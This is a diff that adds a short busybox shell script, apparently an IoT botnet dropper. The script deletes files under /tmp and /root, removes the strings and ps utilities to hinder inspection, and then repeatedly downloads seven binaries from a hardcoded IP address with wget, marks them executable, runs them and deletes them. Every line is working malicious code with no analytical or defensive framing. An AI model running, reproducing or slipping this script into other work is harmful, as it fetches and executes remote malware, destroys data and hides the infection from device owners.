@@ -1,0 +1,24 @@
+#!/bin/sh
+
+busybox rm -rf /tmp/*
+busybox rm -rf /root/*
+busybox rm -rf /usr/bin/strings
+busybox rm -rf /usr/bin/ps
+
+rm -f *
+busybox wget http://179.43.141.228/1; busybox chmod +x 1; ./1; busybox rm -f 1*
+rm -f *
+busybox wget http://179.43.141.228/2; busybox chmod +x 2; ./2; busybox rm -f 2*
+rm -f *
+busybox wget http://179.43.141.228/3; busybox chmod +x 3; ./3; busybox rm -f 3*
+rm -f *
+busybox wget http://179.43.141.228/4; busybox chmod +x 4; ./4; busybox rm -f 4*
+rm -f *
+busybox wget http://179.43.141.228/5; busybox chmod +x 5; ./5; busybox rm -f 5*
+rm -f *
+busybox wget http://179.43.141.228/6; busybox chmod +x 6; ./6; busybox rm -f 6*
+rm -f *
+busybox wget http://179.43.141.228/7; busybox chmod +x 7; ./7; busybox rm -f 7*
+rm -f *
+sleep 1
+exit
